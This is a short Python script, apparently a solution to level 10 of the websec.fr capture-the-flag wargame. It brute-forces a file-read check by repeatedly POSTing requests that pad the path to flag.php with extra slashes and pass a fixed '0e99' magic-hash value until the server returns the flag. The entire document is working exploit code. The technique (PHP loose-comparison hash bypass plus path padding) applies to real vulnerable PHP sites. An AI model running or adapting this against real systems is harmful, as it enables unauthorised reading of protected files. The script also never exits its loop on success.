slashes = "./"
stop = False
while not stop:
    resp = requests.post(fr"https://websec.fr/level10/index.php?f={slashes}flag.php&hash=0e99")
    if "Permission denied!" in resp.text:
        print(f"{len(slashes) - 1} number of slashes didn't work, trying again")
        slashes = slashes + "/"
    else:
        print(f"{len(slashes) - 1} number of slashes did work!")
        print(resp.text)